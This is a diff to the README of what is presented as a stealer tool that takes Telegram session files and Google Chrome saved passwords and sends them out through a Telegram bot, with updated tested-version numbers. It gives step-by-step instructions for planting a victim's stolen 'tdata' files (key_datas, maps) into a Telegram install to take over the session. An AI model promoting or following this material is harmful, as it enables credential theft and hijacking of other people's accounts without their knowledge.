@@ -1,6 +1,6 @@
 # telegram session + chrome passwords stealer
 Steals telegram session(without any notifications) and google chrome credentials. Sending via telegram bot.
-Definitely works in 2020 with Chrome Version 84.0.4147.105 (Official Build)(the newest on the uploading date: 08.08.2020) and Telegram version 2.3.1.0.
+Definitely works in 2020 with Chrome Version 86.0.4240.75 (Official Build)(the newest on the uploading date: 12.10.2020) and Telegram version 2.4.3.0.
 
 How to use:
 
@@ -14,7 +14,7 @@ How to use telegram session files:
 2. Run "Telegram.exe" 1 time until "tdata" folder appears.
 3. Go to "tdata".
 4. Delete "D877F783D5D3EF8??" and "key_datas" files and put your "D877F783D5D3EF8??" and "key_datas" instead.
-5. Go to "D877F783D5D3EF8C" folder or just create it.
+5. Go to "D877F783D5D3EF8C" folder or just create it and open.
 6. Delete "maps" file if exists and put your "maps" file instead.
 7. Go back and run "Telegram.exe".
 
